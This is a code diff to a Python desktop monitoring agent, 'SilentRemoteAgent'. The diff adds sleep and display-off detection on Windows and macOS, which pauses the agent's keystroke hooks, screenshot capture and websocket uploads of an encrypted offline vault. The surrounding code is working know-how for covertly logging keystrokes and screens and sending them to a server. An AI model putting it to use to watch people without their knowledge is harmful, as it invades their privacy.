@@ -213,13 +213,87 @@ def classify_focus_category(app_name: str, app_id: str, resource_title: str) -> 
     return "Productividad y Gestion"
 
 
-# 2. Lectura de Inactividad y Ventana Activa (API nativa de Windows / macOS)
+# 2. Lectura de Inactividad, Energia y Ventana Activa (API nativa de Windows / macOS)
 if IS_WINDOWS:
     class LASTINPUTINFO(ctypes.Structure):
         _fields_ = [
             ("cbSize", ctypes.c_uint),
             ("dwTime", ctypes.c_uint),
         ]
+
+    class _GUID(ctypes.Structure):
+        _fields_ = [
+            ("Data1", ctypes.c_uint32),
+            ("Data2", ctypes.c_uint16),
+            ("Data3", ctypes.c_uint16),
+            ("Data4", ctypes.c_ubyte * 8),
+        ]
+
+    class _POWERBROADCAST_SETTING(ctypes.Structure):
+        _fields_ = [
+            ("PowerSetting", _GUID),
+            ("DataLength", ctypes.c_uint32),
+            ("Data", ctypes.c_ubyte * 4),
+        ]
+
+    _WIN_PID_EXE_CACHE: Dict[int, str] = {}
+    _WIN_IS_SUSPENDED = False
+    _WIN_DISPLAY_OFF = False
+    _WIN_PWR_WATCHER_STARTED = False
+    _WIN_WNDPROC_REF = None
+
+    def _start_windows_power_watcher():
+        global _WIN_PWR_WATCHER_STARTED, _WIN_WNDPROC_REF
+        if _WIN_PWR_WATCHER_STARTED:
+            return
+        _WIN_PWR_WATCHER_STARTED = True
+
+        def _pwr_thread():
+            global _WIN_IS_SUSPENDED, _WIN_DISPLAY_OFF, _WIN_WNDPROC_REF
+            try:
+                user32 = ctypes.windll.user32
+                WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p, ctypes.c_uint, ctypes.c_size_t, ctypes.c_ssize_t)
+
+                def _wnd_proc(hwnd, msg, wparam, lparam):
+                    global _WIN_IS_SUSPENDED, _WIN_DISPLAY_OFF
+                    if msg == 0x0218:  # WM_POWERBROADCAST
+                        if wparam == 0x0004:  # PBT_APMSUSPEND
+                            _WIN_IS_SUSPENDED = True
+                        elif wparam in (0x0006, 0x0007, 0x0012):  # PBT_APMRESUME*
+                            _WIN_IS_SUSPENDED = False
+                        elif wparam == 0x8013 and lparam:  # PBT_POWERSETTINGCHANGE
+                            pbs = ctypes.cast(lparam, ctypes.POINTER(_POWERBROADCAST_SETTING)).contents
+                            state_val = int(pbs.Data[0])
+                            _WIN_DISPLAY_OFF = (state_val == 0)
+                            if state_val == 1:
+                                _WIN_IS_SUSPENDED = False
+                        return 1
+                    return user32.DefWindowProcW(ctypes.c_void_p(hwnd), msg, ctypes.c_size_t(wparam), ctypes.c_ssize_t(lparam))
+
+                _WIN_WNDPROC_REF = WNDPROC(_wnd_proc)
+                user32.CreateWindowExW.restype = ctypes.c_void_p
+                hwnd = user32.CreateWindowExW(0, "STATIC", "SITAI_PwrMsg", 0, 0, 0, 0, 0, ctypes.c_void_p(-3), None, None, None)
+                if hwnd:
+                    gwlp_wndproc = -4
+                    if hasattr(user32, "SetWindowLongPtrW"):
+                        user32.SetWindowLongPtrW(ctypes.c_void_p(hwnd), gwlp_wndproc, _WIN_WNDPROC_REF)
+                    else:
+                        user32.SetWindowLongW(ctypes.c_void_p(hwnd), gwlp_wndproc, _WIN_WNDPROC_REF)
+                    # GUID_CONSOLE_DISPLAY_STATE: {6FE69556-704A-47A0-8F24-C28D936FDA47}
+                    guid = _GUID(0x6FE69556, 0x704A, 0x47A0, (ctypes.c_ubyte * 8)(0x8F, 0x24, 0xC2, 0x8D, 0x93, 0x6F, 0xDA, 0x47))
+                    user32.RegisterPowerSettingNotification(ctypes.c_void_p(hwnd), ctypes.byref(guid), 0)
+                    msg_buf = (ctypes.c_byte * 48)()
+                    while user32.GetMessageW(ctypes.byref(msg_buf), None, 0, 0) > 0:
+                        user32.TranslateMessage(ctypes.byref(msg_buf))
+                        user32.DispatchMessageW(ctypes.byref(msg_buf))
+            except Exception:
+                pass
+
+        threading.Thread(target=_pwr_thread, daemon=True, name="SITAI-WinPower").start()
+
+    def is_system_sleeping() -> bool:
+        _start_windows_power_watcher()
+        return bool(_WIN_IS_SUSPENDED or _WIN_DISPLAY_OFF)
 
     def get_idle_seconds() -> int:
         try:
@@ -245,16 +319,24 @@ if IS_WINDOWS:
                     raw_title = buff.value.strip()
                 pid = ctypes.c_ulong(0)
                 ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
-                if pid.value:
-                    hproc = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid.value)
-                    if hproc:
-                        try:
-                            pbuf = ctypes.create_unicode_buffer(1024)
-                            psz = ctypes.c_ulong(1024)
-                            if ctypes.windll.kernel32.QueryFullProcessImageNameW(hproc, 0, pbuf, ctypes.byref(psz)):
-                                exe_name = os.path.basename(pbuf.value).strip()
-                        finally:
-                            ctypes.windll.kernel32.CloseHandle(hproc)
+                pid_val = int(pid.value or 0)
+                if pid_val:
+                    cached_exe = _WIN_PID_EXE_CACHE.get(pid_val)
+                    if cached_exe:
+                        exe_name = cached_exe
+                    else:
+                        hproc = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid_val)
+                        if hproc:
+                            try:
+                                pbuf = ctypes.create_unicode_buffer(1024)
+                                psz = ctypes.c_ulong(1024)
+                                if ctypes.windll.kernel32.QueryFullProcessImageNameW(hproc, 0, pbuf, ctypes.byref(psz)):
+                                    exe_name = os.path.basename(pbuf.value).strip()
+                                    if len(_WIN_PID_EXE_CACHE) > 128:
+                                        _WIN_PID_EXE_CACHE.clear()
+                                    _WIN_PID_EXE_CACHE[pid_val] = exe_name
+                            finally:
+                                ctypes.windll.kernel32.CloseHandle(hproc)
             low_exe = exe_name.lower()
             if low_exe in WINDOWS_EXE_MAP:
                 app_name = WINDOWS_EXE_MAP[low_exe]
@@ -322,6 +404,11 @@ elif IS_MAC:
                 cg = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
                 cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
                 cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_uint32]
+                cg.CGMainDisplayID.restype = ctypes.c_uint32
+                cg.CGDisplayIsAsleep.argtypes = [ctypes.c_uint32]
+                cg.CGDisplayIsAsleep.restype = ctypes.c_uint32
+                cg.CGGetActiveDisplayList.argtypes = [ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32)]
+                cg.CGGetActiveDisplayList.restype = ctypes.c_int32
                 _MAC_CG = cg
             sec = _MAC_CG.CGEventSourceSecondsSinceLastEventType(0, 0xFFFFFFFF)
             if sec >= 0:
@@ -329,6 +416,21 @@ elif IS_MAC:
         except Exception:
             pass
         return 0
+
+    def is_system_sleeping() -> bool:
+        """Detecta si el Mac esta suspendido, en DarkWake/PowerNap con tapa cerrada o con todas las pantallas apagadas."""
+        try:
+            if _MAC_CG is None:
+                get_idle_seconds()
+            if not _MAC_CG:
+                return False
+            ids = (ctypes.c_uint32 * 16)()
+            cnt = ctypes.c_uint32(0)
+            if _MAC_CG.CGGetActiveDisplayList(16, ids, ctypes.byref(cnt)) == 0 and cnt.value > 0:
+                return all(bool(_MAC_CG.CGDisplayIsAsleep(ids[i])) for i in range(cnt.value))
+            return bool(_MAC_CG.CGDisplayIsAsleep(_MAC_CG.CGMainDisplayID()))
+        except Exception:
+            return False
 
     _OBJC_LIB = None
     _MSG_SEND_VOID = None
@@ -571,6 +673,9 @@ elif IS_MAC:
 else:
     def get_idle_seconds() -> int:
         return 0
+
+    def is_system_sleeping() -> bool:
+        return False
 
     def inspect_foreground_context() -> dict:
         lbl = platform.system()
@@ -1669,6 +1774,7 @@ class SilentRemoteAgent:
         self._vault_lock = threading.Lock()
         self._last_contact_persist_ts: float = 0.0
         OFFLINE_VAULT_DIR.mkdir(parents=True, exist_ok=True)
+        self._vault_has_pending: bool = any(OFFLINE_VAULT_DIR.glob("*.sitai"))
         self._init_or_verify_offline_deadline()
 
     def _init_or_verify_offline_deadline(self):
@@ -1729,6 +1835,7 @@ class SilentRemoteAgent:
                 tmp_path = OFFLINE_VAULT_DIR / f".{fname}.tmp"
                 tmp_path.write_bytes(encrypted_bytes)
                 tmp_path.replace(fpath)
+                self._vault_has_pending = True
 
                 # Rotación FIFO preventiva para acotar espacio máximo en disco
                 vault_files = sorted(OFFLINE_VAULT_DIR.glob("*.sitai"))
@@ -1762,12 +1869,15 @@ class SilentRemoteAgent:
         """
         while True:
             await asyncio.sleep(3.5)
-            if not self.ws:
+            if not self.ws or not self._vault_has_pending or is_system_sleeping():
                 continue
             try:
                 vault_files = sorted(OFFLINE_VAULT_DIR.glob("*.sitai"))
+                if not vault_files:
+                    self._vault_has_pending = False
+                    continue
                 for vf in vault_files[:8]:
-                    if not self.ws:
+                    if not self.ws or is_system_sleeping():
                         break
                     try:
                         raw_bytes = vf.read_bytes()
@@ -1785,6 +1895,8 @@ class SilentRemoteAgent:
 
     def _handle_raw_key_event(self, key_repr: str, ts: float):
         """Callback invocado por MF-01 KeyboardEventHook."""
+        if is_system_sleeping():
+            return
         with self._typing_lock:
             current_win = get_active_window_title() or "Escritorio"
             if not self._typing_session_active:
@@ -1816,6 +1928,8 @@ class SilentRemoteAgent:
         """
         screenshot_b64 = ""
         screenshot_fmt = "webp"
+        if is_system_sleeping():
+            return screenshot_b64, screenshot_fmt
         try:
             if sct is not None:
                 mon_count = max(1, len(sct.monitors) - 1)
@@ -1830,7 +1944,7 @@ class SilentRemoteAgent:
             max_w = 3200 if mon_count > 1 else 1920
             if img.width > max_w:
                 ratio = float(max_w) / img.width
-                img = img.resize((max_w, int(img.height * ratio)), Image.LANCZOS)
+                img = img.resize((max_w, int(img.height * ratio)), Image.Resampling.BILINEAR)
             buf = io.BytesIO()
             try:
                 img.save(buf, format="WEBP", quality=80, method=4)
@@ -2208,6 +2322,8 @@ class SilentRemoteAgent:
 
     def capture_focus_evidence_webp(self) -> Tuple[str, str]:
         """MF-ST06: Captura ligera WebP calidad 75 (max 1440px / 2560px multi-monitor)."""
+        if is_system_sleeping():
+            return "", "webp"
         try:
             with mss.mss() as local_sct:
                 mon_count = max(1, len(local_sct.monitors) - 1)
@@ -2239,15 +2355,32 @@ class SilentRemoteAgent:
         return drained
 
     async def focus_monitor_loop(self):
-        """MF-ST04: Sondeo ligero cada 0.8s con estabilizacion de 1.8s para App y Pestana."""
+        """MF-ST04: Sondeo adaptativo con pausa total en suspension y estabilizacion de 1.8s."""
         last_mono = time.monotonic()
+        sleep_step = 0.85
         while True:
-            await asyncio.sleep(0.8)
+            await asyncio.sleep(sleep_step)
             now_mono = time.monotonic()
-            dt = max(0.0, min(4.0, now_mono - last_mono))
+            raw_dt = now_mono - last_mono
             last_mono = now_mono
 
+            if is_system_sleeping() or raw_dt > 15.0:
+                self._candidate_key = None
+                self._candidate_ctx = None
+                self._candidate_hold_secs = 0.0
+                self._stable_started_mono = now_mono
+                sleep_step = 2.5 if is_system_sleeping() else 0.85
+                continue
+
             idle_secs = get_idle_seconds()
+            if idle_secs >= 180:
+                self._candidate_key = None
+                self._candidate_ctx = None
+                self._candidate_hold_secs = 0.0
+                sleep_step = 2.2
+                continue
+            sleep_step = 0.85
+            dt = max(0.0, min(4.0, raw_dt))
             ctx = inspect_foreground_context()
             cur_key = (ctx["app_name"], ctx["resource_title"])
             stable_key = (self._stable_ctx["app_name"], self._stable_ctx["resource_title"])
@@ -2326,10 +2459,28 @@ class SilentRemoteAgent:
             last_tick_time = time.monotonic()
             while True:
                 await asyncio.sleep(4.0)
-                tick += 1
                 now_mono = time.monotonic()
-                delta_secs = max(1, round(now_mono - last_tick_time))
+                raw_delta = now_mono - last_tick_time
                 last_tick_time = now_mono
+
+                # Si el equipo esta suspendido / DarkWake / pantalla apagada, cerrar WS y no emitir nada
+                if is_system_sleeping():
+                    self._resource_slices_acc.clear()
+                    self.streaming = False
+                    if self.ws:
+                        try:
+                            await self.ws.close()
+                        except Exception:
+                            pass
+                        self.ws = None
+                    continue
+
+                tick += 1
+                if raw_delta > 20.0:
+                    self._resource_slices_acc.clear()
+                    delta_secs = 4
+                else:
+                    delta_secs = max(1, round(raw_delta))
                 now_ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
                 idle_secs = get_idle_seconds()
@@ -2402,7 +2553,8 @@ class SilentRemoteAgent:
                             "session_background": is_bg,
                             "log_events": log_events,
                         }
-                        if tick % 3 == 1:
+                        thumb_stride = 15 if idle_secs >= 180 else 3
+                        if tick % thumb_stride == 1:
                             thumb_b64 = self.capture_thumbnail_b64(sct)
                             payload["thumbnail"] = thumb_b64
                             if IS_WINDOWS and not thumb_b64:
@@ -2607,6 +2759,9 @@ class SilentRemoteAgent:
         perm_bg_task = asyncio.create_task(self.macos_permission_heal_loop())
 
         while True:
+            if is_system_sleeping():
+                await asyncio.sleep(2.5)
+                continue
             try:
                 ssl_ctx = self._build_ssl_context()
                 async with websockets.connect(
